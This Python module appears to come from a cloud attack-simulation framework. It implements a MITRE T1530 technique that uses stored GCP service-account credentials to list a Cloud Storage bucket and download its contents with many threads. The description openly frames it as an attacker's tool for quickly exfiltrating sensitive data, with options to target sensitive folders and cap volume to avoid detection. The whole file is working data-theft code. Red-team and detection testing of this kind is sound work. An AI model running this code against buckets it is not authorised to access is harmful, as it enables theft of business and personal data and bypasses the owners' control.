from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueNote, TechniqueReference
from ..technique_registry import TechniqueRegistry

from typing import Dict, Any, Tuple, List
import os
import datetime
import json
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.gcp.gcp_access import GCPAccess
from core.Constants import OUTPUT_DIR
from google.cloud import storage
from google.oauth2.service_account import Credentials as ServiceAccountCredentials
from google.auth.transport.requests import Request

@TechniqueRegistry.register
class GCPExfilStorageBuckets(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1530",
                technique_name="Data from Cloud Storage",
                tactics=["Collection"],
                sub_technique_name=None
            )
        ]
        technique_notes = [
            TechniqueNote(
                "Ensure sufficient disk space is available when exfiltrating large buckets"
            ),
            TechniqueNote(
                "Use folder_path parameter to target specific sensitive data directories"
            ),
            TechniqueNote(
                "Use download_limit to control data volumes when exfiltrating large buckets"
            ),
            TechniqueNote(
                "Downloads are multi-threaded - adjust max_workers based on system resources"
            ),
            TechniqueNote(
                "Downloaded files maintain original folder structure for easier analysis"
            ),
            TechniqueNote(
                "Technique requires existing GCP authentication with storage.objects.list and storage.objects.get permissions"
            ),
            TechniqueNote(
                "Technique automatically handles pagination for buckets with many objects"
            ),
        ]
        technique_refs = [
            TechniqueReference(
                "Cloud Storage Documentation", 
                "https://cloud.google.com/storage/docs/introduction"
            ),
            TechniqueReference(
                "Cloud Storage Best Practices", 
                "https://cloud.google.com/storage/docs/best-practices"
            ),
            TechniqueReference(
                "Understanding Storage Access Control", 
                "https://cloud.google.com/storage/docs/access-control"
            ),
            TechniqueReference(
                "Cloud Storage Security Blog", 
                "https://cloud.google.com/blog/products/storage-data-transfer/google-cloud-storage-best-practices-to-help-ensure-data-privacy-and-security"
            ),
            TechniqueReference(
                "GCP Doc : Download Objects", 
                "https://cloud.google.com/storage/docs/downloading-objects#storage-download-object-python"
            )
        ]
        super().__init__(
            name="Exfiltrate Storage Bucket",
            description="""Downloads and exfiltrates data from Google Cloud Storage buckets while maintaining original folder hierarchies. This 
            technique enables attackers to quickly extract large amounts of data from cloud storage, with options for targeted 
            exfiltration of specific folders or limiting download volumes to avoid detection. The multi-threaded download capability 
            allows rapid exfiltration of business-critical data, backups, and sensitive files commonly stored in cloud buckets. 
            The technique works even with complex bucket structures, preserving the original organization for easier data analysis.""",
            mitre_techniques=mitre_techniques,
            references=technique_refs,
            notes=technique_notes
        )

    def _download_blob(self, blob: storage.Blob, local_path: str, progress_dict: Dict) -> Tuple[bool, str]:
        """Downloads a single blob with error handling"""
        try:
            # Create directory structure if it doesn't exist
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            
            # Download the blob
            blob.download_to_filename(local_path)
            
            # Update progress tracking
            progress_dict['success'] += 1
            progress_dict['downloaded_size'] += blob.size
            
            return True, ""
            
        except Exception as e:
            progress_dict['failed'] += 1
            return False, str(e)

    def _filter_blobs(self, blobs: List[storage.Blob], folder_path: str = None, 
                     download_limit: int = None) -> List[storage.Blob]:
        """Filters blobs based on folder path and download limit"""
        filtered_blobs = []
        
        for blob in blobs:
            if folder_path:
                # Normalize path separators for cross-platform compatibility
                norm_folder_path = os.path.normpath(folder_path)
                norm_blob_name = os.path.normpath(blob.name)
                if not norm_blob_name.startswith(norm_folder_path):
                    continue
                    
            filtered_blobs.append(blob)
            
            if download_limit and len(filtered_blobs) >= download_limit:
                break
                
        return filtered_blobs

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            bucket_name: str = kwargs.get("bucket_name")
            folder_path: str = kwargs.get("folder_path")
            download_limit: int = kwargs.get("download_limit")
            max_workers: int = kwargs.get("max_workers", 10)

            # Input validation
            if bucket_name in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required": "Bucket Name"}
                }

            # Input sanitization - remove any path separators from bucket name
            bucket_name = os.path.basename(bucket_name)

            # Create storage client using current credentials
            manager = GCPAccess()
            current_access = manager.get_current_access()
            loaded_credential = json.loads(base64.b64decode(current_access["credential"]))
            scopes = [
                "https://www.googleapis.com/auth/devstorage.read_only"
            ]
            request = Request()
            credential = ServiceAccountCredentials.from_service_account_info(loaded_credential, scopes=scopes)
            credential.refresh(request=request)
            storage_client = storage.Client(credentials=credential)

            # Get bucket
            bucket = storage_client.bucket(bucket_name)
            if not bucket.exists():
                return ExecutionStatus.FAILURE, {
                    "error": f"Bucket {bucket_name} does not exist",
                    "message": f"Failed to access bucket {bucket_name}"
                }

            # List all blobs
            blobs = list(bucket.list_blobs())
            if not blobs:
                return ExecutionStatus.SUCCESS, {
                    "message": f"No objects found in bucket {bucket_name}",
                    "value": {
                        "bucket_name": bucket_name,
                        "objects_found": 0,
                        "downloaded": 0,
                        "failed": 0,
                        "total_size": 0
                    }
                }

            # Filter blobs based on folder path and limit
            filtered_blobs = self._filter_blobs(blobs, folder_path, download_limit)
            
            # Create download directory with timestamp in a cross-platform way
            dt_stamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            base_download_path = os.path.join(OUTPUT_DIR, "gcp_storage_download", bucket_name, dt_stamp)
            os.makedirs(base_download_path, exist_ok=True)

            # Progress tracking
            progress = {
                'success': 0,
                'failed': 0,
                'downloaded_size': 0
            }

            # Download blobs using thread pool
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                
                for blob in filtered_blobs:
                    local_path = os.path.join(base_download_path, blob.name)
                    
                    future = executor.submit(
                        self._download_blob,
                        blob,
                        local_path,
                        progress
                    )
                    futures.append(future)

                # Wait for all downloads to complete
                for future in as_completed(futures):
                    # Handle any exceptions from the threads
                    future.result()

            return ExecutionStatus.SUCCESS, {
                "message": "Successfully exfiltrated GCP storage bucket",
                "value": {
                    "bucket_name": bucket_name,
                    "objects_found": len(filtered_blobs),
                    "downloaded": progress['success'],
                    "failed": progress['failed'],
                    "total_size_bytes": progress['downloaded_size'],
                    "download_path": base_download_path,
                    "folder_filtered": bool(folder_path),
                    "download_limited": bool(download_limit)
                }
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": f"Failed to exfiltrate bucket {bucket_name}"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "bucket_name": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "Bucket Name",
                "input_field_type": "text"
            },
            "folder_path": {
                "type": "str",
                "required": False,
                "default": None,
                "name": "Folder Path",
                "input_field_type": "text"
            },
            "download_limit": {
                "type": "int",
                "required": False,
                "default": None,
                "name": "Download Limit",
                "input_field_type": "number"
            },
            "max_workers": {
                "type": "int", 
                "required": False,
                "default": 10,
                "name": "Max Worker Threads",
                "input_field_type": "number"
            }
        }